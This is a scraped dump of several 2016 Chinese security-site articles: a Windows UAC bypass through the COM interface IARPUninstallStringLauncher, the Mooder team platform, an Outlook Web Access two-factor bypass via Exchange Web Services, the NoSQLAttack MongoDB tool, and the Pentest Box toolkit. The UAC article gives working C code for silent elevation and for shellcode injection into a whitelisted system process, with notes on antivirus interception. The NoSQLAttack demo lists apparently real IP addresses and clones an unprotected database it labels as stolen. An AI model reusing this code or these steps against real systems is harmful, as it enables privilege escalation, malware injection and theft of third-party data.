V8漏洞技术分析与防护方案","http://nsoad.com/Article/web/20160828/330.html"
"5ccbfb024f2f0a0a7a69c0fa","前言最近笔者对之前利用windows卸载接口绕过UAC的研究资料进行了整理,这里指的并非Github这份代码中的模拟鼠标点击的方式，而是编码实现程序自身调用windows卸载接口从而绕","silence","前言最近笔者对之前利用windows卸载接口绕过UAC的研究资料进行了整理,这里指的并非Github这份代码中的模拟鼠标点击的方式，而是编码实现程序自身调用windows卸载接口从而绕过UAC的方式。简介细心的朋友可能会发现,通过windows的控制面板卸载程序的时候不会触发UAC框,那么其背后的原理是什么呢？主要有三点：1.调用位于CARPUninstallStringLauncherCOM组件中IARPUninstallStringLauncher接口的LaunchUninstallStringAndWait方法来实现卸载程序。2.获取autoelevate的IARPUninstallStringLauncher接口指针,这里实际就是将中完整性级别提升至高完整性级别,这一步在不可信的宿主程序中执行的时候会触发UAC窗口。3.步骤2中的操作要在windows的白名单程序中执行才不会触发UAC框,哪些是白名单程序呢?位于系统目录%systemroot%下的很多exe都是白名单程序,比如说:记事本,计算器,桌面等等。逆向分析控制面板的卸载功能首先向控制面板的已安装程序列表中添加一个测试条目,要实现这里一点只需要在注册表键HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall下添加一个子键即可.该子键导出的reg文件模版如下:Windows Registry Editor Version 5.00[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\{18E78D31-BBCC-4e6f-A21D-0A15BBC62D49}]""DisplayName""=""利用COM接口ARPUninstallStringLauncher绕过默认等级UAC演示示例""""UninstallString""=""D:\\VSProject\\ElevateUI\\Release\\ElevateUI.exe""""Publisher""=""ExpLife""""DisplayVersion""=""1.0""该模版中各个键名的具体含义请参见上图.其中{18E78D31-BBCC-4e6f-A21D-0A15BBC62D49}这个名称大家可以根据需要替换成任意字符串。接下来将windbg附加到桌面进程,对创建进程的API函数CreateProcessW设置断点。然后运行起来,接着在刚刚添加的测试条目上单击鼠标右键并选择右键菜单项&lt;卸载/更改(U)&gt;。这时断了下来,查看一下调用堆栈可以看到,控制面板中的单击鼠标右键的卸载菜单项实际上是调用的appwiz.cpl模块中IARPUninstallStringLauncher接口的LaunchUninstallStringAndWait方法。通过IDA加载appwiz.cpl,然后查看一下交叉引用图解接着查看一下LaunchUninstallStringAndWait这个方法的反编译代码这里IDA对于LaunchUninstallStringAndWait这个方法的几个参数识别有误.第一个参数是this指针,可以暂时不用理会,第二,第三,第四个参数的含义我们可以通过ReadUninstallStringFromRegistry这个函数的内部实现来进行推敲.该函数的功能根据函数名称字面的意思应该是从注册表中读取卸载字符串.反编译代码如下:该函数还是很容易还原的,笔者反推如下:返回上一层看看效果,是不是该函数参数的含义一目了然了!最后一个参数hWnd并没有用到,我们暂时不予理会。逐步推敲可知LaunchUninstallStringAndWait这个方法的功能就是从注册表指定的键值中读取卸载字符串(即卸载程序的命令字符串),然后通过该卸载程序的命令字符串创建卸载进程。那么我们应该给这各个参数传什么数值呢?我们首先断到这个方法来看看,系统传递的值是多少?通过堆栈中的数值我们可以知道,该函数的第二个参数和第四个参数系统传的是0。第二个参数hKey不要想当然的传HKEY_CURRENT_USER,这个宏的值实际为0×80000001,根据ReadUninstallStringFromRegistry的第一个参数的表达式(hKey != 0) – -x7FFFFFFF来看,当hKey的值为0时候, (hKey != 0) – -x7FFFFFFF的值才为0×80000001,即HKEY_CURRENT_USER.所以hKey这个参数应该填0。第三个参数pUninstallRegKey实际上是HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall这个注册表键下的子键的名称第四个参数bIsModifyOrUninstall表示卸载或者更改状态对应的布尔值,填0表示卸载。第五个参数hWnd该函数中并没有用到,所以直接填NULL.光有LaunchUninstallStringAndWait这个方法还不够呀,这个方法并没有体现权限是如何提升的呀!我们继续往上层回溯,根据调用堆栈的情况,我们查看一下上层函数的交叉引用图示由于LaunchUninstallStringAndWait是通过虚函数的形式调用的,也就是说运行时动态调用的,所以静态分析的交叉引用凸显不出来。下面我们要重点关注的就是CInstalledApp这个接口中的_CreateAppModifyProcess方法。这个方法调用了非常多的外部方法,规模有点庞大。将该图示放大可以找到一个比较有意思的方法-CoCreateInstanceAsAdminWithCorrectBitness.这个方法其实就是用来提权,笔者将该方法反编译的代码整理如下：如果编程功底比较弱,那么你看到这段代码也可能丈二脑袋摸不着头脑,但是你通过将其编码成C/C++代码依然可以实现你想要的功能：如果开发功底好的话,应该会知道微软官方有如下的介绍: https://msdn.microsoft.com/zh-cn/library/windows/desktop/ms679687.aspx,其中有示例代码：该示例代码与IDA反编译的代码基本等价.所以逆向与开发是相辅相成的.要重视实际编程的历练。好了下面我们使用微软官方的工具OLEViewer查看一下appwiz.cpl这个组件的类型库.因为要调用COM组件中的接口,最直接的方法是需要导入类型库的。但是笔者在该类型库中并没有找到IARPUninstallStringLauncher这个接口的描述信息。但是笔者在全局分支All Object下找到了如下组件描述信息那么极有可能IARPUninstallStringLauncher这个接口是供微软内部使用的.从该描述信息中我们可以得知：CARPUninstallStringLauncher(即ARP UninstallString Launcher)这个组件的CLSID为{FCC74B77-EC3E-4DD8-A80B-008A702075A9}.IARPUninstallStringLauncher这个接口的IID为{F885120E-3789-4FD9-865E-DC9B4A6412D2}与IDA中呈现出来的GUID是一致的.好了,由于找不到appwiz.cpl的类型库,所以笔者只好退而求其次,直接获取COM组件对象的地址,然后通过访问虚函数表来获取接口中方法的指针. CARPUninstallStringLauncher接口的虚表布局如下, LaunchUninstallStringAndWait的偏移为0x0C。编码实现绕过UAC的功能核心提权代码HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void ** ppv){        BIND_OPTS3 bo;    WCHAR  wszCLSID[50];    WCHAR  wszMonikerName[300];        StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID)/sizeof(wszCLSID[0]));     HRESULT hr = StringCchPrintf(wszMonikerName, sizeof(wszMonikerName)/sizeof(wszMonikerName[0]), L""Elevation:Administrator!new:%s"", wszCLSID);    if (FAILED(hr))        return hr;    memset(&amp;bo, 0, sizeof(bo));    bo.cbStruct = sizeof(bo);    bo.hwnd = hwnd;    bo.dwClassContext  = CLSCTX_LOCAL_SERVER;    return CoGetObject(wszMonikerName, &amp;bo, riid, ppv);}                                int _tmain(int argc, _TCHAR* argv[]){            CLSID  clsid;    IID iid;    LPVOID ppv = NULL;    HRESULT hr;    PFN_IARPUninstallStringLauncher_LaunchUninstallStringAndWait pfn_LaunchUninstallStringAndWait = NULL;    PFN_IARPUninstallStringLauncher_Release pfn_IARPUninstallStringLauncher_Release = NULL;        if (IIDFromString(L""{FCC74B77-EC3E-4DD8-A80B-008A702075A9}"", &amp;clsid) ||        IIDFromString(L""{F885120E-3789-4FD9-865E-DC9B4A6412D2}"", &amp;iid))    return 0;        CoInitialize(NULL);            hr = CoCreateInstanceAsAdmin(NULL, clsid, iid, &amp;ppv);        if (SUCCEEDED(hr))    {            pfn_LaunchUninstallStringAndWait  = (PFN_IARPUninstallStringLauncher_LaunchUninstallStringAndWait)(*(DWORD*)(*(DWORD*)ppv + 12));            pfn_IARPUninstallStringLauncher_Release = (PFN_IARPUninstallStringLauncher_Release)(*(DWORD*)(*(DWORD*)ppv + 8));                        if (pfn_LaunchUninstallStringAndWait &amp;&amp; pfn_IARPUninstallStringLauncher_Release)            {                pfn_LaunchUninstallStringAndWait((LPVOID*)ppv, 0, L""{18E78D31-BBCC-4e6f-A21D-0A15BBC62D49}"", 0, NULL);                pfn_IARPUninstallStringLauncher_Release((LPVOID*)ppv);            }    }        CoUninitialize();        return 0;}调试运行,发现会弹出UAC框为什么呢？因为执行该提权代码宿主的身份是不可信的,所以我们需要想办法让这段代码在windows的白名单程序中运行.所以很直接的会想到将这段代码注入到诸如计算器,记事本,桌面等等程序中去执行,这样就不会弹出UAC框了。将提权代码转换为shellcode并注入到白名单程序中执行关键代码:BOOL BypassUacWithInject(LPTSTR lpExe){    HMODULE hModule = GetModuleHandle(NULL);    TCHAR cAppName[MAX_PATH] = {0};    STARTUPINFO si;    PROCESS_INFORMATION pi;    LPVOID lpMalwareBaseAddr;    LPVOID lpNewVictimBaseAddr;    HANDLE hThread;    DWORD dwExitCode;    BOOL bRet = FALSE;    lpMalwareBaseAddr = g_ByPassUac;    AddUninstallItem(lpExe);    GetSystemDirectory(cAppName, MAX_PATH);    _tcscat(cAppName, InjectTarget);    ZeroMemory(&amp;si, sizeof(si));    si.cb = sizeof(si);    ZeroMemory(&amp;pi, sizeof(pi));    if (CreateProcess(cAppName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,    NULL, NULL,    &amp;si, &amp;pi) == 0)    {        return bRet;    }    lpNewVictimBaseAddr = VirtualAllocEx(pi.hProcess,        NULL,        SizeOfBypassUac,        MEM_COMMIT | MEM_RESERVE,        PAGE_EXECUTE_READWRITE);    if (lpNewVictimBaseAddr == NULL)    {        return bRet;    }    WriteProcessMemory(pi.hProcess, lpNewVictimBaseAddr, (LPCVOID)lpMalwareBaseAddr, SizeOfBypassUac, NULL);    hThread = CreateRemoteThread(pi.hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpNewVictimBaseAddr, NULL, 0, NULL);    WaitForSingleObject(pi.hThread, INFINITE);    GetExitCodeProcess(pi.hProcess, &amp;dwExitCode);    TerminateProcess(pi.hProcess, 0);    DeleteUninstallItem();    return bRet;}由于有注入行为,所以主流杀毒软件可能会拦截那么有没有无需注入的方法呢？当然有。利用rundll32来加载自定义dll中导出函数rundll32调用dll的导出函数是有特殊规定的,函数必须是如下形式: VOID CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);但是笔者测试发现通过函数名称调用会报错。笔者逆向了一下rundll32.exe的实现,变相的解决了报错的问题.这里弹出的错误框通过样式可知是MessageBoxW弹出的,通过交叉引用得到:上层的_DisplayErrorMessage是对MessageBoxW的一个简单封装,我们直接略过,我们重点来看看_InitCommandInfo这个函数的实现,顾名思义:初始化命令行信息.继续转入_FindCommandFunction这个函数.笔者动态调试跟踪发现函数名称填写正确,依然获取不到函数地址.但是之前笔者在没有安装任何杀软的系统上是可以通过名称调用的,所以笔者猜测有可能是杀毒软件的各种挂钩导致的兼容性问题所致,也可能是因为现在利用rundll32来启动的木马病毒泛滥,所以安全软件的沙箱对这个点进行了防护.这里仅仅是猜测,笔者后面如果有精力再来研究。既然通过名称无法调用,正好上面的_FindCommandFunction这个函数表明可以通过序号调用,那我们就通过序号调用呗,笔者测试发现通过序号调用是正常的。POC的测试效果见百度云盘:https://pan.baidu.com/s/1eSftkp8小结调用ARP UninstallString Launcher组件的卸载接口,有如下特点:①与之前的利用DLL劫持这类方法相比更加简单②通用性更好,由于文件系统重定向的缘故,一个32程序就可以兼容x86/x64系统③注不注入都可以 防御建议:监视注册表中特定键值将UAC等级开到最高,其实开到最高,也很难分辨是否存在恶意行为,因为系统的正常操作也可能出现类似的效果文中相关POC代码已上传github,地址为:GitHub参考资料https://technet.microsoft.com/en-us/magazine/2007.06.uac.aspxhttps://technet.microsoft.com/en-us/magazine/2009.07.uac.aspxhttps://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.htmlhttp://bbs.pediy.com/showthread.php?t=206830&amp;highlight=UAChttp://bbs.pediy.com/showthread.php?t=208717&amp;highlight=UAChttps://www.greyhathacker.net/?p=796https://github.com/hfiref0x/UACMEhttps://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/https://github.com/smb01/UacBypassUninstallhttp://www.freebuf.com/sectool/114592.htmlhttps://msdn.microsoft.com/zh-cn/library/windows/desktop/ms679687.aspxhttps://support.microsoft.com/zh-cn/kb/164787","2016-10-17 16:41:34","系统安全","巧用COM接口IARPUninstallStringLauncher绕过UAC","http://nsoad.com/Article/system/20161017/587.html"
"5ccbfb024f2f0a0a7a69c0fb","PunkSPIDER是一款由PunkSCAN出品的大型WEB漏洞扫描器，我们利用它已经建立了一个稳定的扫描体系，每日可以实现无人值守式的运行。此外，其中运行了一个Apache Hadoop集群","Kong","小介绍Mooder是一款开源、安全、简洁、强大的（安全）团队内部知识分享平台，基于Django、全封闭保证私密性、支持Markdown、支持Postgres/Mysql/Sqlite等多种数据库、支持Docker-compose一键化安装与更新，易于二次开发。今天开源的一个小玩意，上个月到这个月陆陆续续写的，这几天下班以后也会写几行这个，进行产品上的微调，然后修一些BUG。本来是给自己团队写的一个东西，但想想感觉应该有很多团队都需要这个，于是就开源了。项目地址： https://github.com/phith0n/mooder文档地址： https://phith0n.github.io/mooder/为什么会有Mooder有的人把Mooder理解为一个漏洞平台：团队成员可以提交漏洞，管理员进行审核与评分，最后能够兑换礼品或兑换其他人的漏洞。但我把它理解为一个“团队贡献”平台，绝不是分享漏洞，而是分享知识。最初我在设计Minos的时候就有这样的想法，只可惜后面走偏了，把Minos做成一个社区了。后来我想想，还是需要这么一个东西，于是我又写了Mooder。一个团队需要有自己独一无二的内容，才能吸引更多人才，而这个平台将是承载这些内容的载体。做Mooder的初衷是为了团队内部的交流。由于众所周知的原因，国内大量社区关闭，安全技术知识的学习变得愈加困难，更多的团队将交流方式变为QQ群、微信群。 而QQ、微信等及时通信工具并不是一个交流技术的好地方，团队仍然需要一个内部社区。Mooder从设计之初想法就是“封闭”，也就是说该社区严格控制内部隐私，仅拥有邀请码的用户可以登录社区，管理员在后台也能够踢出、删除一个用户，保证了社区的私密性。另外，Mooder的核心理念的“贡献知识”。团队成员可以将自己挖掘的通用漏洞、编写的EXP、提交到其他SRC的漏洞详情、众测中挖到的漏洞等等作为一个“贡献”提交到Mooder中，然后由管理员进行审核并给予rank与积分。通过该“积分”，团队成员也可以购买其他成员提交的贡献，或者去礼品中心换取礼品等。通过这样的“知识交换”，让团队能够更快地成长。一些小预览用户登录Mooder支持登录、邀请码注册、找回密码、登录激活。注册：查看贡献贡献列表，列出所有贡献：详情页面，根据贡献的私密程度判断用户是否可读。用户在提交贡献的时候可以选择该贡献的可见性：公开、出售或私密。公开的贡献，所有平台注册用户均可查看；出售的贡献，其他用户需要付出一定价格购买，才能查看当前贡献，而贡献提交者将可以或者这笔费用；私密的贡献，除贡献作者与审核员外任何人无法查看。提交与审核贡献提交贡献支持Markdown编辑详情，支持上传图片与附件，支持预览：管理员后台审核贡献：礼品中心团队负责人可以在后台进行礼品上架，用于奖励乐于分享的成员。前台礼品中心：用户填写收货地址进行礼品兑换：管理员后台查看购买记录：虚拟物品可以直接通过“管理员回复”发货：后台管理审核员后台，可以方便地进行贡献（漏洞）的审核，也能极好的控制权限——可以控制审核员只能审核贡献、运营人员只能修改礼品与发货。后台首页显示一些统计信息：一键生成邀请码：增加内部应用：用户奖惩：","2016-10-27 15:24:49","安全工具","开源SRC项目、团队内部贡献平台Mooder","http://nsoad.com/Security-tools/20161027/tools-650.html"
"5ccbfb024f2f0a0a7a69c0fc","前言全面公布：BLACK HILLS信息安全非常赞成负责任地公布漏洞。2016年9月28日我向微软报告了这个漏洞，可一直到这篇文章发布（2016.11.2）期间，微软对于此漏洞始终没有任何","Kong","前言全面公布：BLACK HILLS信息安全非常赞成负责任地公布漏洞。2016年9月28日我向微软报告了这个漏洞，可一直到这篇文章发布（2016.11.2）期间，微软对于此漏洞始终没有任何的反应，除了这句""目前还未有进展""。漏洞发布整个过程的时间表，可以在文章末看到。漏洞分析美国时间下午3点更新：这篇文章讲述了如何绕过微软网页版Outlook的双因子认证（它由第三方DUO Security公司提供）。首先说明一点：这次的漏洞不是DUO Security公司的产品引起的。而是由于双因子认证没有起到对微软的Exchange服务器的保护作用，进而导致Exchange服务器的Web接口暴露。在第六届的DerbyCon会议上，我公开了一个叫做MailSniper的工具，它可以用来爬取微软的Exchange服务器上有关邮箱的敏感信息。MailSniper的工作原理是当连接到Exchange Web serveices(EWS)服务器上的时候，会尝试获取用户的收件箱。EWS是一个Web接口，当用户在部署客户端的时候，微软建议使用EWS来和Exchange服务器交互。当使用EWS之后，应用就可以从用户的收件箱获取的邮箱信息，联系人，日历等。在DerbyCon的会议上，我听了Nick Landers的对于Hacker，Outlook和Exchange可以做什么的演讲。这是一个超级棒的演讲，并且我推荐你去听一下。在他的演讲中，Nick收到一个观众的提问：双因子验证（2FA）是否就可以防止黑客攻击？Nick由此讲述了一个非常有趣的观点，他说：“我曾经看到过某些公司在OWA（Outlook网页版）上关闭了双因子验证，所以在OWA上面登录的时候，你必须提供一个令牌。但是这样就有被攻击的危险：因为双因子验证实际并没有起到应有的作用。所以我猜想如果EWS没有使用双因子验证，那么利用它，使用MailSniper就有可能读取到用户的邮件，完全绕过双因子安全验证。我来验证这个想法，我设置了网页登录OWA，并且安装了DUO security公司的双因子验证软件--Duo for Outlook。我在手机上设置了DUO的移动应用，并且登录OWA使用测试用户账户""vladi@eldershogun.com""。在使用我的手机同步了DUO之后，如果我登录账户认证，我的手机就可以收到的确认通知。这一步完成之后，如果我是黑客，同时没有手机同步DUO软件的双因子验证，在登录OWA之后我就不可能有其他进展了。在此之前，MailSniper只有在设置了主机域名之后才可以工作。我修改了部分代码，添加了""-Remote""选项，这样Invoke-Selfsearch函数就可以远程工作。另外还需要修改才可以获取收件箱。首先，需要确定公司使用的外部邮箱服务器。一般情况来说，可以使用Autodiscover搜索，或者爆破子域名比如：mail.domain.com,owa.domain.com,webmail.domain.com等。邮箱服务器需要使用'-ExechHostname'参数来指定。如果这个参数没有指定，Invoke-selfSearch就会自动尝试获取邮箱服务器。其次，用户的密码凭证需要先收集起来。更多需要注意的地方可以看这篇博客。一旦Exchange服务器和用户的密码凭证收集之后，下面的命令可以用来在网络上寻找邮箱。Invoke-SelfSearch -Mailbox email@domain.com -ExchHostname mail.domain.com -Remote上面的命令运行之后，授权凭证窗口就会出现，要求输入目标用户的登陆凭证。这里是输入内部邮箱地址还是输入域帐号取决于该组织的设定。在用户凭证输入之后，MailSniper会尝试连接EWS的这个URL：https://mail.domain.com/EWS/Exchange.asmx。并且在用户的收件箱搜索相关关键词内容（默认是密码,凭证,证书）。我使用这种方法在设置了DUO双因子验证的账户上尝试攻击。MailSniper可以成功绕过双因子验证并且搜索到相关邮件。为了更深入证明这个不是DUO双因子验证的问题，BHIS公司设置了Office365并且利用微软自己的工具Azure Multi-Factor Autoentication(MFA)来保护用户从Office365登录到Outlook邮箱。演示如下：我首先在网页端登录到测试用户的Office 365账户。在输入了正确的账户密码之后，微软的MFA验证是必须的。在这种情况下，我让他给我的手机发送一条短信验证码。在MFA确认了验证码之后，测试用户账户可以查看Outlook.Office.com上面的收件箱。使用先前描述的方法使用EWS绕过双因子验证仍然有效。在MailSniper验证了outlook.office365.com密码之后，攻击者仍然可以绕过双因子验证来读取用户的收件箱。演示视频建议我想最简单的解决方法就是废掉Exchange Web Services, 但这也会毁掉很多东西。比如，Mac上的Outlook只能通过Exchange Web Service连接到Exchange，这种情况废掉EWS可能不是一个好办法。任何客户端APP利用EWS也是这样的情况。所以，短期来讲，限定OWA只能从内网访问，同时允许用户VPN访问。对于某个用户帐户或整个团体手动限定EWS是可能的。但是，要记得任何使用app的用户，通过EWS连接到Exchange的可能会连接失败。结论总之，Outlook网页登录的双因子认证对于微软的Exchange来说，完全覆盖使用到其他认证协议是有点困难。在这篇文章中，已经证明了EWS服务并没有被双因子验证所保护。并且只需要知道用户的登录凭证就可以读取到用户的收件箱。Exchange的其他服务，比如使用HTTP传输的MAPI，或者自动扫描发现。我再次测试了第三方的双因子登录验证软件和微软的AWS，并且我猜想其他也会存在相同的问题。漏洞发布时间表2016.9.28 东部时间下午1:51 –通过secure@microsoft.com，向微软报告了此漏洞。2016.9.28 东部时间下午10:01 – 收到微软回复，他们已将此问题反馈给相关人员分析。“ 你好，非常感谢您及时通知MSRC，我已将您的报告反馈给相关人员分析，会及时向您回复分析结果。谢谢！MSRC   2016.10.3 东部时间上午11:15 – 发邮件询问进展2016.10.3 东部时间下午7:41 – 收到回复，他们已经开始审理此问题。“非常感谢您的报告。我已建立了案例35494，REDACTED是负责人，如有问题，您可以联系他。同时，我们希望您能遵守我们的漏洞公布指引，不要将此漏洞向公众公布，直到用户可以保护他们的信息为止。您可以在http://www.microsoft.com/technet/security/bulletin/policy.mspx浏览我们的公告确认政策，在http://www.microsoft.com/security/msrc/default.mspx查看我们的一般法律法规。如果您在任何时间有任何问题或进一步的信息，请回复邮件。谢谢MSRC2016.10.11 东部时间上午8:55 --发邮件询问进展2016.10.11 东部时间下午 4:07 – 收到回复，正在等待产品团队审核。“您好：      我们还在等待产品团队审核，如果有进一步的信息，我会及时通知您。谢谢MSRC2016.10.21 东部时间下午3:37 --发邮件询问进展2016.10.24 东部时间下午4:46 – 收到回复无进展“您好：      现在还没有任何进展，如果有进一步的信息，我会及时通知您。 谢谢MSRC2016.11.2 – 在Black Hills 信息安全处，公开此漏洞。","2016-11-04 11:10:57","系统安全","OWA和Offic365双因子认证绕过（附演示视频）","http://nsoad.com/Article/system/20161104/698.html"
"5ccbfb024f2f0a0a7a69c0fd","介绍NoSQLAttack 是一个用python编写的开源的攻击工具，用来暴露网络中默认配置mongoDB的IP并且下载目标mongoDB的数据，同时还可以针对以mongoDB为后台存储的应用进行注入攻","kong","介绍NoSQLAttack 是一个用python编写的开源的攻击工具，用来暴露网络中默认配置mongoDB的IP并且下载目标mongoDB的数据，同时还可以针对以mongoDB为后台存储的应用进行注入攻击，使用这个工具就可以发现有成千上万的mongoDB裸奔在互联网上，并且数据可以随意下载。这个攻击工具是基于tcstool的NoSQLMap和搜索引擎shodan一些攻击的数据是来自于以下论文给予的启发Diglossia: Detecting Code Injection Attacks with Precision and EfficiencyNo SQL, No Injection?Several thousand MongoDBs without access control on the Internet.NoSQL注入攻击测试系统NoSQLInjectionAttackDemo，这里面有两个系统用来测试注入攻击。背景介绍在NoSQL注入攻击中有PHP数组注入，js注入和mongo shell拼接注入等多种方法可以攻击mongoDB，并且现在有成千上万的mongoDB暴露在互联网上，只要知道目标mongoDB的ip和端口号就可以把裸露的mongoDB中的数据都下载下来。运行环境项目运行在linux系统上，NoSQLAttack的依赖包已经写在setup.py文件里，并且已经在ubantu和MAC OX上都测试了，只需要执行这个脚本就可以自动配置好安装环境 开发这个项目使用时使用的是Pycharm COMMUNITY 2016.1，python的版本为2.7.10，使用者需要在本地电脑安装mongoDB。安装在linux系统下可以直接将下载的项目解压，然后执行以下两个命令cd NoSQLAttack  python setup.py install  使用方法安装完毕后，执行一下命令就可以启动该项目NoSQLAttack  启动该项目后将会展现如下的界面，然后就可以开启黑客之旅了================================================NoSQL Attack  ================================================    NoSQLAttack-v0.2  sunxiuyang04@gmail.com1-Scan attacked IP  2-Configurate parameters  3-MongoDB Access Attacks  4-Injection Attacks  x-Exit  系统演示===============================================NoSQL Attack  ================================================     NoSQLAttack-v0.2  sunxiuyang04@gmail.com1-Scan attacked IP  2-Configurate parameters  3-MongoDB Access Attacks  4-Injection Attacks  x-Exit  Select an option:1  Start Scanning.....  Results found:28793  1_Attacked IP : 149.202.88.135  2_Attacked IP : 49.212.186.80  3_Attacked IP : 85.9.62.231  4_Attacked IP : 121.78.239.11  5_Attacked IP : 54.226.207.112  6_Attacked IP : 119.254.66.44  7_Attacked IP : 121.46.0.83  8_Attacked IP : 162.243.21.180  9_Attacked IP : 210.23.29.75  Select IP to attack:2  Start Default Configuration Attack(y/n)?y  DB access attacks(mongoDB)  =========================Checking to see if crendentials are need  49.212.186.8027017  Successful access with no credentials!1-Get Server Version and Platform  2-Enumerate Databases/Collections/Users  3-Clone a Database  4-Return to Main Menu  Select an attack: 2  List of databases:  MultiCopyService_UserData  SmartNFC_UserData  SmartShop_UserData  KioskPointMng2_UserData  admin  db  local1-Get Server Version and Platform  2-Enumerate Databases/Collections/Users  3-Clone a Database  4-Return to Main Menu  Select an attack: 3(1)MultiCopyService_UserData(2)SmartNFC_UserData(3)SmartShop_UserData(4)KioskPointMng2_UserData(5)admin(6)db(7)dbItem(8)localSelect a database to steal:6  Does this Database require credentials.(y/n)?n  Database cloned. Copy another (y/n)?","2016-11-15 21:22:37","安全工具","NoSQLAttack - 一款针对 mongoDB 的攻击工具","http://nsoad.com/Security-tools/20161115/tools-783.html"
"5ccbfb024f2f0a0a7a69c0fe","写这个专题还得从前几天FreeBuf上的一篇文章说起，这篇文章就是《专访Kapustkiy——那个最近黑了多国大使馆的黑客》，当时评论里面对这个黑客是各种嘲讽。","kong","前言写这个专题还得从前几天FreeBuf上的一篇文章说起，这篇文章就是《专访Kapustkiy——那个最近黑了多国大使馆的黑客》，当时评论里面对这个黑客是各种嘲讽。但是居然还有人说FreeBuf各种不好了各种话！这个我就不服了！唉…..这位读者朋友还是太年轻啊，不会看重点——作为窃.格瓦拉驻FreeBuf办公室主任，我有必要发一篇文章来说明一下上面那篇文章的重点。注意看下面这段话，这个黑客说他只用一个叫做Pentest Box的工具就把全球的大使馆黑了个遍！哎哟，我去！这个究竟是什么黑科技！ 当我查阅完Pentest Box的官方文档介绍后，我像下面这个树袋熊一样震惊了！Pentest Box是一款Windows平台下预配置的便携式开源渗透测试环境，而它也是著名黑客Kapustkiy常用的工具之一。在安全测试的过程中，大部分脚本工具都是基于Linux平台运行，比如bash、cat、chmod、curl、git、gzip、ls、mv、ps、ssh、sh、uname等。Linux相比windows，安装和更新软件更加高效，排除故障更加方便和稳定。windows窗口化界面操作和特殊工具的兼容性，也导致大部分安全人员严重依赖于windows系统，因此使用windows的安全测试人员大部分都会在虚拟机内运行各式各样的Linux操作系统。但是虚拟机运行Linux也有相对应的缺点，首先是内存占用过高，其次是操作没有那么方便。基于以上问题，Pentest Box被开发出来了。如果要说Kali中阿D最好使，我认为windows中Pentest Box最好使。特性易于使用Pentest Box和Linux有些相似，可以完全依靠命令行工具进行使用，这点很符合Linux和Mac OS发烧友的口味。设计简洁整个Pentest从安装到使用非常简洁，就靠一个exe文件来启动，并且安装也是一键式安装。除了安装目录以外，没有多余的地方需要设置。性能卓越和虚拟机相比，Pentest Box完全运行于Windows系统上，不依赖任何虚拟系统，有着更加强悍的性能。没有依赖需求如果我们要在windows上使用SQLMAP或者metasploit之类的工具，可能需要安装各种各样的语言环境，比如python，ruby，php，Java等。但是所有的依赖需求都已经安装在Pentest Box内部，你无需再去安装任何环境，设置任何环境变量等。方便携带Pentest Box不需要安装注册表，不需要特别的驱动，因此有极强的携带性，可以直接拷贝到U盘内运行。Linux 工具集Pentest Box工具包内含有各式各样的Linux工具，包括但不限于bash、cat、chmod、curl、git、gzip、ls、mv、ps、ssh、sh、uname等，它甚至包含了Linux编辑神器 “vim”。无驱动问题在VM中运行Linux最头疼的主要是驱动兼容问题，就算有VM TOOL的支持，有时候也会爆出各种各样的bug。但是在Pentest Box无需担心这个问题。只要windows内安装了相关驱动，就没必要再去考虑驱动问题。模块化虽然Pentest Box已经集成了非常多优秀的Linux工具，但是你依然可以自定义添加自己的模块。Pentest Box中的toolsmanager可以对Pentest Box内部的工具进行更新，卸载和安装。更少的内存占用一般情况下，在虚拟机中运行Linux系统可能需要2GB的内存，但是在Pentest Box中只需要20MB的内存。更少的磁盘占用我安装完带MSF的Pentest Box，大约占用了4.5GB的硬盘，而我安装完Kali Linux 64位的VM后则占用了20多GB的硬盘。可见相对于虚拟机Linux来说，Pentest Box占用更小的空间。内置浏览器Pentest Box中内置一个Firefox浏览器，并且已经安装好优秀的安全测试插件。测试插件的列表我等等会在下方写出来。可更新特性虽然Pentest Box中的toolsmanager功能可以对脚本进行更新，但是Pentest Box依然有自己的更新指令，可以对框架，配置文件，环境等进行更新。易于分享正如我所说，Pentest Box有着优秀的携带性，因此它还可以安装在云端，达到一个多人共用协作的功能，比如dropbox，百度云盘，google云盘等。32位和64位系统支持大部分工具可能并不太会关心windows 32位的兼容性，但是Pentest Box可以完美兼容32位和64位的windows系统。Pentest Box的开发人员已经在ASUS X205TA（售价200美元的低配电脑）上以windows 32位系统完美运行Pentest Box。下载安装这个感觉没什么好说的，进入官网下载页面，点击下载即可。Pentest Box官方下载页面：https://pentestbox.org/zh/#download安装也没什么复杂的，随便安装再哪个磁盘都可以，你安装在Dropbox或者百度云盘内都没问题。但是下载的时候注意了，下载选项上有两个选项，一个是包含Metasploit的，一个是未包含Metasploit的。这里根据大家的需求来选择下载。脚本程序安装/更新/卸载默认安装的脚本在Pentest Box中已经安装多个优秀的Linux脚本，大家可以对着下面的链接，以防重复添加脚本程序。Pentest Box内置默认工具名单列表：https://tools.pentestbox.org/#linux-utilities使用很简单，如果你要使用sqlmap，你直接在命令行上敲打sqlmap就可以了。每个工具的使用命令都在上面的列表里，大家自行查找。Pentest Box中内置了一个火狐浏览器，浏览器已经安装了几个非常实用的插件，具体的插件列表名单请浏览下面的链接。Pentest Box 火狐浏览器已安装插件：https://addons.mozilla.org/en-US/firefox/collections/pentestbox/pentestbox-addons-collection/?page=1更新脚本Pentest Box全部的源码都在GitHub上，而Pentest Box的更新全部是基于GitHub的代码库。GitHub地址如下。Pentest Box GitHub地址：https://github.com/pentestbox如果要对Pentest Box更新，你可以使用update命令，以下是update的更新脚本源代码所在位置。update的更新脚本：https://github.com/pentestbox/scripts/blob/master/update.py2013年和2014年因为某次事件，导致GitHub被墙了两次。虽然现在已经解封了，但是有时候还是有点抽风，如果遇到无法更新的情况，请自备梯子。安装已知未被安装脚本Pentest Box安装脚本程序主要是采用ToolsManager这个工具。Pentest Box除了默认已经安装的脚本以外，还有一些未被安装的已知脚本程序。已知脚本程序列表大家可以访问下方连接获取到。Pentest Box已知未被安装脚本列表：https://modules.pentestbox.org/首先输入toolsmanager，然后你会得到一个工具分类的列表。再根据列表对应的编号选择进入列表查看所包含的工具。比如我输入了1就进入了Exploitation 